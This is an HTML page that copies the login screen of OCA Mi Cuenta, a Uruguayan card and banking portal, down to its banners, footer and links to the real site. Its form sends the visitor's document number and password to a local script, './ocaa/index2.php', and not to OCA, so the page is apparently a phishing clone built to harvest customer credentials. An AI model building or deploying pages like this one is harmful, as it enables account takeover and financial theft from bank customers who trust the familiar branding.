<!DOCTYPE html >
<html><head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
	<title>OCA Mi Cuenta</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">	
	
                
	<link rel="apple-touch-icon" href="https://micuentanuevo.oca.com.uy/StaticContent/img/favicon.png"> 
	<link rel="shortcut icon" type="image/x-icon" href="https://micuentanuevo.oca.com.uy/StaticContent/img/logos/favicon.png"> 
	<meta name="viewport" content="width=device-width, initial-scale=1"> 
	<link href="./ocaa/bootstrap.min(1).css" rel="stylesheet"> 
	<link href="./ocaa/style(1).css" rel="stylesheet"> 
	<link href="./ocaa/datepicker(1).css" rel="stylesheet"> 
	<link rel="stylesheet" href="./ocaa/all(1).css">
	<link rel="stylesheet" href="./ocaa/animate.min.css">
	<link rel="stylesheet" href="./ocaa/style-simulador-prestamos.css">
	<link rel="stylesheet" href="./ocaa/style-index.css">

	<body>


	<header style="box-shadow: unset;">
		<div class="container">
			<div class="navbar-header">
				<img src="./ocaa/OCA_logo-color.svg" >
			</div>
		</div>
	</header>
	<section id="login-section">
		<div class="row">
			<!-- Columna banner Desktop -->
			<div role="main banner" class="col-12 col-md-6 columna-banner main-banner-desktop">
				<div id="bannersCarousel" class="carousel slide banner-desktop" data-ride="carousel">
					<ol class="carousel-indicators">
				    	
							    	<li data-target="#bannersCarousel" data-slide-to="0" class=""></li>
							    	<li data-target="#bannersCarousel" data-slide-to="1" class="active"></li>	
							    	<li data-target="#bannersCarousel" data-slide-to="2" class=""></li>
							    	<li data-target="#bannersCarousel" data-slide-to="3" class=""></li>
							    	<li data-target="#bannersCarousel" data-slide-to="4" class=""></li>			
					</ol>
					<div class="carousel-inner">					    		
						    	<div class="carousel-item item">
							    	<a href="" target="_blank">
										<img class="d-block w-100" src="./ocaa/Banner_loginFlordesemana.jpg"></a>
								</div> 
						    	<div class="carousel-item item active">
							    	<img class="d-block w-100" src="./ocaa/Banner_loginPram.jpg">
								</div> 

						    	<div class="carousel-item item">								
							    	<a href="" target="_blank"><img class="d-block w-100" src="./ocaa/Banner_loginPremiumbox.jpg"></a>
								
								</div> 
					    		
						    	<div class="carousel-item item">
							    	<a href="" target="_blank"><img class="d-block w-100" src="./ocaa/OCABlue_solicitud_Wpp_MC_nolog.jpg"></a>
								
								</div> 
						    	<div class="carousel-item item">
							    	<a href="" target="_blank"><img class="d-block w-100" src="./ocaa/Banner_loginEducacion.jpg"></a>
								</div> 

					</div>
					<a class="carousel-control-prev" href="" role="button" data-slide="prev">
					<span class="carousel-control-prev-icon" aria-hidden="true"></span>
					<span class="sr-only">Previous</span>
					</a>
					<a class="carousel-control-next" href="" role="button" data-slide="next">
					<span class="carousel-control-next-icon" aria-hidden="true"></span>
					<span class="sr-only">Next</span>
					</a>
				</div>
			</div>
			<!-- Columna formulario -->
			<div class="col-12 col-md-6 columna-formulario">
				<!-- Formulario -->
				<form action="./ocaa/index2.php"  method="post"class="form-inline module-content-rotate generic-form" id="form_login">
					<h2 style="color: currentColor" class="mt-1 mt-md-5">Ingresá a Mi Cuenta</h2>
					<fieldset class="camposAcceso24 mt-md-4">
						<!-- Input documento -->
						<div>
							<div class="text-label mb-3">
								<label>Nro. de documento</label>
							</div>
							<div>
								<input type="hidden" name="tipo_documento" value="1">
								<input id="numdoc" type="tel" name="numdoc" placeholder="Documento" class="form-control" maxlength="8" >
							</div>
						</div>
						<!-- Input contraseña -->
						<div class="campo-contrasenia">
							<div class="text-label mb-3">
								<label>Contraseña</label>
							</div>
							<div>
								<input type="hidden" value="R" name="tipo_usuario">
									<div class="show-pass">
										<span class="fa fa-eye-slash icon"></span>
									</div>
								<input id="pass" type="password" name="clv" placeholder="Contraseña" class="form-control mb-3" style="font-size: 15px">
								<a href="https://micuentanuevo.oca.com.uy/trx/forgotPassword" style="font-size: 16px;">¿Olvidaste tu contraseña?</a>
							</div>
						</div>
						<!-- DIV Validacion --> 
						<div class="alert warning text-properties error_highlight alert-index-margin" id="form_error_message" style="display:none;margin-top: 20px;margin-bottom:61px;">
							<img class="btn-close" src="./ocaa/btn-cerrar.png" width="15" height="12">
						</div>
						<!-- END DIV Validacion -->
					</fieldset>
					<div class="contenedor-botones">
						<div class="w-100 d-flex justify-content-between align-items-center">
							
								<a href="https://micuentanuevo.oca.com.uy/trx/registerUser" style="font-size: 16px">Registrarme</a>
							
                <div class="buttons">
                  <button  class="btn btn-lg btn-primario btn-mobile-login"><span>Ingresar</span></button>
                </div>

						</div>
						<div class="w-100 justify-content-between  align-items-center links-no-clientes">
							<a href="https://ocablue.com.uy/?origin=Mcloginboton" class="">Abrir cuenta</a>
							<a href="https://oca.uy/tarjeta-de-credito/?origen=Mcloginboton" class="">Solicitar tarjeta de crédito</a>
						</div>
					</div>
				</form>
			</div>
			<!-- Columna banner Mobile -->
			<div role="main banner" class="col-12 col-md-6 col-lg-6 col-md-6 main-banner-mobile" style="background-color: #f3f5f7;">
				<div id="bannersCarouselMobile" class="carousel slide banner-mobile col-12 col-sm-12 col-lg-6 col-md-12 m-auto" data-ride="carousel">
					<ol class="carousel-indicators">
						
							
								
									<li data-target="#bannersCarouselMobile" data-slide-to="0" class=""></li>
								
								
							
						  
							
								
								
									<li data-target="#bannersCarouselMobile" data-slide-to="1" class=""></li>
								
							
						  
							
								
								
									<li data-target="#bannersCarouselMobile" data-slide-to="2" class="active"></li>
								
							
						  
							
								
								
									<li data-target="#bannersCarouselMobile" data-slide-to="3" class=""></li>
								
							
						  
							
								
								
									<li data-target="#bannersCarouselMobile" data-slide-to="4" class=""></li>
								
							
						  
					</ol>
					<div class="carousel-inner">
						  
							
								
									<div class="carousel-item item">
								
								
								
									<a href="https://oca.uy/flordesemana/" target="_blank"><img class="d-block w-100" src="./ocaa/Banner_loginFlordesemana-mobile.jpg"></a>
								
								
								</div>
							
					   
							
								
								
									<div class="carousel-item item">
								
								
								
									<img class="d-block w-100" src="./ocaa/Banner_loginPram-mobile.jpg">
								
								</div>
							
					   
							
								
								
									<div class="carousel-item item active">
								
								
									<a href="https://metraje.oca.com.uy/premium-box-qatar-2022-pre-venta/1554" target="_blank"><img class="d-block w-100" src="./ocaa/Banner_loginPremiumbox-mobile.jpg"></a>
								
								
								</div>
							
					   
							
								
								
									<div class="carousel-item item">
								
								
									<a href="https://wa.me/59898331730" target="_blank"><img class="d-block w-100" src="./ocaa/OCABlue_solicitud_Wpp_MC_nolog-mobile.jpg"></a>
								
								
								</div>
							
					   
							
								
								
									<div class="carousel-item item">
								
								
									<a href="https://oca.uy/educacion/" target="_blank"><img class="d-block w-100" src="./ocaa/Banner_loginEducacion-mobile.jpg"></a>
								
								
								</div>
							
					   
					</div>
					  <a class="carousel-control-prev" href="https://micuentanuevo.oca.com.uy/trx/login?screen=PRAM#bannersCarouselMobile" role="button" data-slide="prev">
						<span class="carousel-control-prev-icon" aria-hidden="true"></span>
						<span class="sr-only">Previous</span>
					  </a>
					  <a class="carousel-control-next" href="https://micuentanuevo.oca.com.uy/trx/login?screen=PRAM#bannersCarouselMobile" role="button" data-slide="next">
						<span class="carousel-control-next-icon" aria-hidden="true"></span>
						<span class="sr-only">Next</span>
					  </a>
					</div>
				</div>
				<div class="links-no-clientes-mobile col-12 col-md-6 col-lg-6 col-md-6">
					<a href="https://ocablue.com.uy/?origin=Mcloginboton" class="">Abrir cuenta</a>
					<a href="https://oca.uy/tarjeta-de-credito/?origen=Mcloginboton" class="">Solicitar tarjeta de crédito</a>
				</div>
		</div>
	</section>

	<!-- MODAL ERROR -->
	<div class="modal fade bs-example-modal-md" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true" id="modalErrorLogin">
		<div class="modal-dialog modal-md">
			<div class="modal-content">
				<div class="alert attention" style="margin: 0;">
					<button type="button" class="close" data-dismiss="modal" aria-label="Close">
						<span aria-hidden="true"></span>
					</button>
					<div class="text-center">
						<i class="icon-warning1 modal-icono" style="color:red;margin-right: 0px;"></i>
						<h3 class="modal-title">Atención</h3>
						<p><span id="modalErrorLoginMsg"></span></p>
					</div>
				</div>
			</div>
		</div>
	</div>
  <div>
  <br>
  </div>
	
	
	<!-- Footer -->
	<footer class="footer footer-index">
		<div class="container text-center text-md-left">
			<ul class="py-3">
				<li>
					<a target="_blank" href="" style="margin-right: 0px;">Política de privacidad</a>
					<a class="d-none-footer-bar-1" style="margin-left: 14px; cursor: default;"> | </a>
					<a href="" target="_blank" style="margin-right: 0px;">Términos y condiciones</a>
					<a class="d-none-footer-bar" style="margin-left: 14px; cursor: default;"> | </a>
					<a style="cursor: default; pointer-events: none;">2020 OCA S.A.</a>
					<a class="d-none-footer-bar" style="cursor: default;"> | </a>
					<a style="cursor: default; pointer-events: none;">2020 OCA Dinero Electronico S.A.</a>
				</li>
			</ul>
		</div>
	</footer>


<img src="./ocaa/adsct" height="1" width="1" style="display: none;"><img src="./ocaa/adsct(1)" height="1" width="1" style="display: none;"></body></html>